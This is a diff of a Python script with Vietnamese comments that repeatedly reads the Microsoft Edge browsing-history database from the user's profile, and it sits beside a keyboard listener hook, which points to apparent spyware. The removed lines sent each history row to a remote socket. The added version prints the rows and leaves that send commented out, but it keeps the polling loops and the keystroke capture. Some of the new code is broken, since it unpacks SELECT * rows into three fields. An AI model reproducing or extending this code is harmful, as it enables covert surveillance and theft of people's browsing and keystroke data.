@@ -96,29 +96,60 @@ def getAppHistory():
         
         time.sleep(1)
 def get_edge_history():
-    # Đường dẫn đến cơ sở dữ liệu lịch sử của Microsoft Edge
-    data_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default'
-    history_db = os.path.join(data_path, 'History')
+    while True:
+        
+        # Đường dẫn đến cơ sở dữ liệu lịch sử của Microsoft Edge
+        data_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
 
-    # Kết nối đến cơ sở dữ liệu lịch sử
-    try:
-        connection = sqlite3.connect(history_db)
+
+        # Kết nối đến cơ sở dữ liệu lịch sử
+        try:
+            connection = sqlite3.connect(data_path)
+            cursor = connection.cursor()
+
+            # Thực hiện truy vấn để lấy dữ liệu lịch sử
+            cursor.execute('SELECT * FROM urls')
+            history = cursor.fetchall()
+
+            for row in history:
+                url, title, last_visit_time = row
+                print(f"{last_visit_time}: {title} - {url}")
+
+                # clientSocket.send(web.encode('utf-8'))
+            cursor.close()
+            connection.close()      
+            time.sleep(5)
+
+        except sqlite3.OperationalError as e:
+            print(e)
+def get_browsing_history():
+    while True:
+        
+        db_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
+        # db_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default'
+
+
+        # Kết nối đến cơ sở dữ liệu SQLite
+        connection = sqlite3.connect(db_path)
         cursor = connection.cursor()
 
-        # Thực hiện truy vấn để lấy dữ liệu lịch sử
-        cursor.execute('SELECT * FROM urls')
-        history = cursor.fetchall()
+        # Truy vấn để lấy lịch sử truy cập web
+        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
+        results = cursor.fetchall()
 
-        for row in history:
-            web = "Open web : {}".format(row)
-            print(web) 
-            clientSocket.send(web.encode('utf-8'))
-            
-        connection.close()       
+        # In lịch sử truy cập web
+        print("Browsing History:")
+        for row in results:
+            url, title, last_visit_time = row
+            print(f"{last_visit_time}: {title} - {url}")
 
-    except sqlite3.OperationalError as e:
-        print(e)
-            
+        # Đóng kết nối
+        cursor.close()
+        connection.close()
+
+        # Chờ 5 giây trước khi lấy dữ liệu tiếp theo
+        time.sleep(5)
+           
 with Listener(on_press=on_press) as parent:
     try:
         while True:
